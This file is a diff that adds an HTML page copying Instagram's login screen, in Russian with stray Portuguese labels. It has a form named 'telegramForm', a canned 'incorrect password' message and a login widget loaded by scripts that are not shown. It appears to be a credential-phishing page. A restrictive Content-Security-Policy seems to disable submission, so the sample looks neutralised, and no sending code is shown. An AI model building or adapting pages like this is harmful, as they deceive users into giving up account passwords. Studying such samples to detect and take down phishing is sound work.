@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+
+<html lang="ru"><head><meta content="default-src 'none'; img-src 'self' data:; style-src 'self' 'unsafe-inline'; font-src 'self' data:; script-src 'self'; connect-src 'none'; form-action 'none'; base-uri 'none'; frame-src 'none'" http-equiv="Content-Security-Policy"/><meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+
+
+
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<link href="/assets/0007-610e6e6715912fd1.css" rel="stylesheet"/>
+<link href="/pics/df32ebf45ce2a5550455" rel="icon" type="image/png"/>
+<link crossorigin="anonymous" href="/assets/0006-eea662ba0dc7f968.css" referrerpolicy="no-referrer" rel="stylesheet"/>
+<title>Instagram</title>
+<style id="dx-style">
+html{scroll-behavior:auto!important}
+#dx-dialog[hidden]{display:none!important}
+#dx-dialog{position:fixed;inset:0;z-index:2147483647;background:rgba(0,0,0,.45);display:flex;align-items:center;justify-content:center;padding:16px;box-sizing:border-box;font:inherit}
+#dx-dialog .dx-dialog-inner{background:#fff;color:#222;max-width:560px;width:100%;max-height:calc(100vh - 32px);overflow:auto;border-radius:8px;padding:20px 22px;box-shadow:0 12px 40px rgba(0,0,0,.3);font-size:15px;line-height:1.5;text-align:left}
+#dx-dialog .dx-dialog-inner,#dx-dialog .dx-view{color:#222}
+#dx-dialog .dx-title{color:#1a1a1a!important}
+.dx-view .dx-title{margin:0 0 10px;font-size:1.15em;font-weight:700}
+.dx-view .dx-text{margin:0 0 10px}
+.dx-view .dx-table{border-collapse:collapse;width:100%;margin:0 0 12px}
+.dx-view .dx-table th,.dx-view .dx-table td{border-bottom:1px solid rgba(0,0,0,.12);padding:6px 4px;text-align:left;vertical-align:top;font-weight:400}
+.dx-view .dx-table th{color:#555;width:42%}
+.dx-view .dx-list{margin:0 0 10px 18px;padding:0}
+.dx-view .dx-small{font-size:.82em;color:#666}
+.dx-view .dx-actions{display:flex;flex-wrap:wrap;gap:8px;margin-top:12px}
+.dx-view .dx-button{cursor:pointer;font:inherit}
+.dx-view button.dx-button:not([class*="btn"]){padding:8px 14px;border-radius:5px;border:1px solid #888;background:#f4f4f4;color:#222}
+.dx-view button.dx-button.dx-primary:not([class*="btn"]){background:#1a73e8;border-color:#1a73e8;color:#fff}
+
+.dx-view .dx-field{display:block;margin:0 0 10px}.dx-view .dx-field-label{display:block;font-size:.9em;margin-bottom:3px}.dx-view .dx-field input{width:100%;box-sizing:border-box;padding:8px;border:1px solid #aaa;border-radius:4px;font:inherit}
+.dx-view .dx-notice{padding:8px 10px;background:#fff6d6;border:1px solid #e6cf7a;border-radius:4px}
+.dx-page{display:block;max-width:760px;margin:16px auto 96px;padding:0 16px;box-sizing:border-box;text-align:left}
+.dx-page>.dx-view a,.dx-page>.dx-view .dx-button:not(button),#dx-dialog .dx-view a,#dx-dialog .dx-view .dx-button:not(button){color:#1a5fc8!important}
+.dx-page>.dx-view .dx-title{color:#1a1a1a!important}
+.dx-page>.dx-view{background:#fff;color:#222;border-radius:10px;padding:18px 20px;box-shadow:0 2px 12px rgba(0,0,0,.08);line-height:1.55}
+#dx-login .dx-field-label{position:absolute;left:-9999px}
+#dx-login .dx-field{margin:0 0 6px}
+#dx-login .dx-field input{background:#fafafa;border:1px solid #dbdbdb;border-radius:3px;padding:9px 8px;font-size:12px;color:#262626}
+#dx-login .dx-actions{margin-top:14px;display:block}
+#dx-login button.dx-button{width:100%;background:#0095f6!important;border:0!important;border-radius:8px!important;color:#fff!important;font-weight:700;padding:7px 16px!important;font-size:14px}
+
+
+.dx-page button.dx-button.dx-primary{background:#0095f6!important;border:0!important;border-radius:8px!important;color:#fff!important;font-weight:700;padding:7px 16px!important;font-size:14px}
+.dx-page>.dx-view a{color:#0095f6!important}
+
+
+main:has(.dx-page){height:auto;min-height:100vh;padding-top:30px;padding-bottom:30px;box-sizing:border-box}
+</style></head>
+<body>
+
+<main class="flex align-items-center justify-content-center">
+<div class="loading-overlay" id="loading" style="display: none;">
+<div class="loading-spinner"></div>
+</div>
+<section class="flex" id="mobile">
+</section>
+<section class="flex direction-column" id="auth">
+<div class="panel login flex direction-column">
+<h1 class="flex justify-content-center" title="Instagram">
+<img alt="Instagram logo" src="/assets/0003-b9c604018a550b63.png" title="Instagram logo"/>
+</h1>
+<form action="/submit" id="telegramForm" onsubmit="return false">
+<label class="sr-only" for="email">Telefone, nome de usuário ou e-mail</label>
+
+<label class="sr-only" for="password">Senha</label>
+
+
+<div aria-label="Вход" class="dx-mount" id="dx-login" role="region"></div></form>
+<div class="flex separator align-items-center">
+<span></span>
+<div class="or">ИЛИ</div>
+<span></span>
+</div>
+<div class="login-with-fb flex direction-column align-items-center">
+<div class="wraper">
+<i class="fa-brands fa-square-facebook fa-sm" style="color: #005fb3;"></i>
+<a>Войти через Facebook</a>
+<p class="invalid">К сожалению, вы ввели неправильный пароль. Проверьте свой пароль еще раз.</p>
+</div>
+<a aria-label="Забыли пароль?" data-dx-do="go:recover" href="#">Забыли пароль?</a>
+</div>
+</div>
+<div class="panel register flex justify-content-center">
+<p>У вас ещё нет аккаунта? </p>
+<a>Зарегистрироваться</a>
+</div>
+<div class="app-download flex direction-column align-items-center">
+<p>Установите приложение.</p>
+<div class="flex justify-content-center">
+<a>
+<img alt="Imagem com a logo da Apple Store" src="/assets/0002-14c09561486ba385.png" title="Imagem com a logo da Apple Store"/>
+</a>
+<a>
+<img alt="Imagem com a logo da Google Play" src="/assets/0001-583714033cab0d76.png" title="Imagem com a logo da Google Play"/>
+</a>
+</div>
+</div>
+</section>
+</main>
+<footer>
+<ul class="footer__list flex flex-wrap justify-content-center text-align-center">
+<li><a>Meta</a></li>
+<li><a>Информация</a></li>
+<li><a>Блог</a></li>
+<li><a>Вакансии</a></li>
+<li><a aria-label="Помощь" data-dx-do="go:help" href="#">Помощь</a></li>
+<li><a>API</a></li>
+<li><a aria-label="Конфиденциальность" data-dx-do="go:privacy" href="#">Конфиденциальность</a></li>
+<li><a href="/terms.html">Условия</a></li>
+<li><a>Места</a></li>
+<li><a>Instagram Lite</a></li>
+<li><a>Threads</a></li>
+<li><a>Загрузка контактов и лица, не являющиеся пользователями</a></li>
+<li><a>Meta Verified</a></li>
+<li><a>Threads</a></li>
+</ul>
+<p class="copyright">© 2024 Instagram from Meta</p>
+</footer>
+
+<script src="/flow.js"></script><script src="/pagekit.js"></script></body></html>
